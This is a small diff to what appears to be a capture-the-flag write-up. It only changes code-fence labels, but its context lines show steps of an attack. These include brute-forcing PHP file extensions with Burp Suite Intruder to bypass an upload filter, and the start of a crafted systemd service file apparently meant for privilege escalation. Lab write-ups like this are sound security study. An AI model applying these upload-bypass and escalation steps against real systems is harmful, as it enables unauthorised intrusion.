@@ -73,7 +73,7 @@ deployment B), lezz go
 
 3. Make a wordlist of different php extensions. Use **burpsuite** to send the upload POST request to `intruder` and add *that dollar-like sign* at appropriate places. Then start the attack.
 
-	```shell
+	```terminal
 	$ cat phpext_list.txt
 	.php
 	.php3
@@ -128,7 +128,7 @@ deployment B), lezz go
 
 	so taking inspiration from that, we can do this
 
-	```bash
+	```terminal
 	$ RFLAG=$(mktemp).service
 	$ echo '[Service]
 	  Type=oneshot
